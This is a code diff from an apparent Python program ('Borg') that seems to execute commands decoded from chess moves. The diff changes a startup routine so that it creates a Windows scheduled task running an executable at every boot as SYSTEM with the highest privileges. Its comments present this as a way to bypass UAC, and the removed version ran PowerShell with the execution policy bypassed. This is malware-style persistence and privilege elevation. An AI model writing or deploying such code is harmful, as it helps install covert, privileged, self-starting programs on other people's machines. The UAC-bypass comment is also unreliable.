@@ -56,22 +56,26 @@ def translate_and_execute_chess_moves(chess_moves, codex_file):
 # Function to add the executable to Windows startup via registry
 def add_to_startup(executable_path, app_name="BorgApp"):
     try:
-        # Prepare the schtasks command
-        schtasks_cmd = f'schtasks /Create /SC ONSTART /TN "Borg" /TR "{executable_path}" /RU "NT AUTHORITY\\LOCALSERVICE" /RL HIGHEST /F'
+        # Command to add task using schtasks with SYSTEM user and no prompt for admin
+        cmd = [
+            'schtasks', '/Create', '/SC', 'ONSTART', 
+            '/TN', 'BorgSystemTask',  # Change the task name to avoid conflicts
+            '/TR', f'"{executable_path}"',  # Ensure the executable path is quoted
+            '/RU', 'SYSTEM',  # Run as SYSTEM user to bypass UAC
+            '/RL', 'HIGHEST',  # Run with the highest privileges
+            '/F'  # Force overwrite if the task already exists
+        ]
 
-        # Build PowerShell command to run with elevated privileges
-        ps_command = f'Start-Process powershell -ArgumentList \'-NoProfile -ExecutionPolicy Bypass -Command "{schtasks_cmd}"\' -Verb RunAs'
+        print(f"Running schtasks command: {' '.join(cmd)}")  # Debugging print
 
-        print(f"Running elevated PowerShell command: {ps_command}")  # Debugging print
+        # Run the command to create the scheduled task
+        result = subprocess.run(cmd, capture_output=True, text=True)
 
-        # Execute the PowerShell command
-        result = subprocess.run(['powershell.exe', '-Command', ps_command], capture_output=True, text=True)
-
-        print("PowerShell output:", result.stdout)
-        print("PowerShell error (if any):", result.stderr)
+        print("Command output:", result.stdout)
+        print("Command error (if any):", result.stderr)
 
         if result.returncode == 0:
-            print(f"Successfully added {executable_path} to Task Scheduler.")
+            print(f"Successfully added {executable_path} to Task Scheduler as SYSTEM.")
         else:
             print(f"Failed to add task. Error: {result.stderr}")
     except Exception as e:
